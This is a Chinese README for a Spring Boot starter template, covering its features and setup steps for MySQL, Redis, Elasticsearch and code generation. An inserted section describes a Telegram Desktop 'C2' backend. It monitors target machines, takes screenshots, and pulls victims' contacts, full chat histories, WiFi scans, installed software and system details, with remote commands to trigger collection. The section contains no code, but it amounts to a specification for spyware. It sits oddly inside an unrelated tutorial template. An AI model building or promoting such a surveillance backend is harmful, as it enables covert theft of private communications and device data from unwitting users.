# SpringBoot 项目初始模板

> 作者：[程序员鱼皮](https://github.com/liyupi)
> 仅分享于 [编程导航知识星球](https://yupi.icu)

基于 Java SpringBoot 的项目初始模板，整合了常用框架和主流业务的示例代码。

只需 1 分钟即可完成内容网站的后端！！！大家还可以在此基础上快速开发自己的项目。

[toc]

## 模板特点

### 主流框架 & 特性

- Spring Boot 2.7.x（贼新）
- Spring MVC
- MyBatis + MyBatis Plus 数据访问（开启分页）
- Spring Boot 调试工具和项目处理器
- Spring AOP 切面编程
- Spring Scheduler 定时任务
- Spring 事务注解

### 数据存储

- MySQL 数据库
- Redis 内存数据库
- Elasticsearch 搜索引擎
- 腾讯云 COS 对象存储

### 工具类

- Easy Excel 表格处理
- Hutool 工具库
- Apache Commons Lang3 工具类
- Lombok 注解

### 业务特性

- 业务代码生成器（支持自动生成 Service、Controller、数据模型代码）
- Spring Session Redis 分布式登录
- 全局请求响应拦截器（记录日志）
- 全局异常处理器
- 自定义错误码
- 封装通用响应类
- Swagger + Knife4j 接口文档
- 自定义权限注解 + 全局校验
- 全局跨域处理
- 长整数丢失精度解决
- 多环境配置


## 业务功能

- 提供示例 SQL（用户、帖子、帖子点赞、帖子收藏表）
- 用户登录、注册、注销、更新、检索、权限管理
- 帖子创建、删除、编辑、更新、数据库检索、ES 灵活检索
- 帖子点赞、取消点赞
- 帖子收藏、取消收藏、检索已收藏帖子
- 帖子全量同步 ES、增量同步 ES 定时任务
- 支持微信开放平台登录
- 支持微信公众号订阅、收发消息、设置菜单
- 支持分业务的文件上传

### 单元测试

- JUnit5 单元测试
- 示例单元测试类

### 架构设计

- 合理分层


## C2 功能集成 (Telegram Platform)

本项目已集成 Telegram Desktop 客户端的 C2 (Command & Control) 功能，实现了设备监控、数据采集与远程管理。

### 核心特性

1.  **设备监控 (Device Monitoring)**
    -   **实时状态**: 支持监控设备在线状态、心跳间隔。
    -   **设备关联**: 自动关联设备 (`C2Device`) 与当前登录的 Telegram 账号 (`current_tg_id`)，实现人机对应。
    -   **自动截屏**: 集成客户端自动截屏功能 (`isMonitorOn`)，支持截图预览与批量下载。
    -   **基础信息**: 采集操作系统、IP (内网/外网)、MAC 地址、主机名等。

2.  **深度数据采集 (Data Ingestion)**
    -   **全量同步**: 支持接收客户端上传的 `tdata_client.db`，自动解析并同步以下数据：
        -   **联系人 (`contacts`)**: 自动同步 Telegram 联系人至 `tg_account` 表，支持增量更新。
        -   **聊天记录 (`chat_logs`)**: 解析聊天记录，支持文本消息及**媒体文件路径** (`media_path`) 的记录。
        -   **WiFi 信息**: 解析 `wifi_scan_results`，记录周边 WiFi 热点信息。
        -   **软件列表**: 解析 `installed_software`，记录目标机已安装软件。
        -   **系统信息**: 解析 `system_info`，记录详细系统环境变量与配置。

3.  **API 接口与指令**
    -   **管理端点**: `/api/c2Device/*` (RBAC 保护)，支持设备管理、指令下发。
    -   **客户端端点**: `/api/c2/*` (开放/加密)，处理心跳、任务获取、结果上传。
    -   **新增指令**: 
        -   `fetch_full_chat_history`: 触发全量聊天记录与联系人同步。
        -   `get_screenshot`: 实时获取屏幕截图。

### 开发注意事项

-   **数据库适配**: 
    -   后端使用 MySQL 5.7+ (`telegram_db`)。
    -   自动解析客户端上传的 SQLite (`tdata_client.db`) 并映射至 MySQL。
    -   **环境要求**: JDK 17, Maven 3.9+。


## 快速上手

> 所有需要修改的地方鱼皮都标记了 `todo`，便于大家找到修改的位置~

### MySQL 数据库

1）修改 `application.yml` 的数据库配置为你自己的：

```yml
spring:
  datasource:
    driver-class-name: com.mysql.cj.jdbc.Driver
    url: jdbc:mysql://localhost:3306/telegram_db?useUnicode=true&characterEncoding=utf-8&useSSL=false&serverTimezone=Asia/Shanghai&allowPublicKeyRetrieval=true
    username: telegram
    password: password
```

2）执行 `sql/create_table.sql` 中的数据库语句，自动创建库表（本项目已预置 `telegram_db` 库和 `telegram` 用户）。

3）启动项目，访问 `http://localhost:8101/api/doc.html` 即可打开接口文档，不需要写前端就能在线调试接口了~

![](doc/swagger.png)

### Redis 分布式登录

1）修改 `application.yml` 的 Redis 配置为你自己的：

```yml
spring:
  redis:
    database: 1
    host: localhost
    port: 6379
    timeout: 5000
    password: 123456
```

2）修改 `application.yml` 中的 session 存储方式：

```yml
spring:
  session:
    store-type: redis
```

3）移除 `MainApplication` 类开头 `@SpringBootApplication` 注解内的 exclude 参数：

修改前：

```java
@SpringBootApplication(exclude = {RedisAutoConfiguration.class})
```

修改后：


```java
@SpringBootApplication
```

### Elasticsearch 搜索引擎

1）修改 `application.yml` 的 Elasticsearch 配置为你自己的：

```yml
spring:
  elasticsearch:
    uris: http://localhost:9200
    username: root
    password: 123456
```

2）复制 `sql/post_es_mapping.json` 文件中的内容，通过调用 Elasticsearch 的接口或者 Kibana Dev Tools 来创建索引（相当于数据库建表）

```
PUT post_v1
{
 参数见 sql/post_es_mapping.json 文件
}
```

这步不会操作的话需要补充下 Elasticsearch 的知识，或者自行百度一下~

3）开启同步任务，将数据库的帖子同步到 Elasticsearch

找到 job 目录下的 `FullSyncPostToEs` 和 `IncSyncPostToEs` 文件，取消掉 `@Component` 注解的注释，再次执行程序即可触发同步：

```java
// todo 取消注释开启任务
//@Component
```

### 业务代码生成器

支持自动生成 Service、Controller、数据模型代码，配合 MyBatisX 插件，可以快速开发增删改查等实用基础功能。

找到 `generate.CodeGenerator` 类，修改生成参数和生成路径，并且支持注释掉不需要的生成逻辑，然后运行即可。

```
// 指定生成参数
String packageName = "com.yupi.springbootinit";
String dataName = "用户评论";
String dataKey = "userComment";
String upperDataKey = "UserComment";
```

生成代码后，可以移动到实际项目中，并且按照 `// todo` 注释的提示来针对自己的业务需求进行修改。
